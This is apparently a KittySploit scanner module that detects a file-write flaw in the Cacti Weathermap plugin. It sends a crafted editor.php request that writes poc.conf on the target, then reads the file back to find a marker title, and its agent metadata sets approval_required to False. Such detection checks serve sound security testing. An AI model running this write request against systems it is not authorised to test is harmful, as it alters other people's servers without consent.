#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cacti Weathermap (a plugin for Cacti, an open-source network monitoring and graphing tool) is vulnerable to fi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cacti Weathermap File Write Detection',
        'description': 'Cacti Weathermap (a plugin for Cacti, an open-source network monitoring and graphing tool) is vulnerable to file write.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'injection', 'cacti', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    def run(self):
        path = '/plugins/weathermap/editor.php?plug=0&mapname=poc.conf&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/plugins/weathermap/configs/poc.conf'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('TITLE 46ea1712d4b13b55b3f680cc5b8b54e8',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='Cacti Weathermap File Write detected', path=path)
            return True
        return False

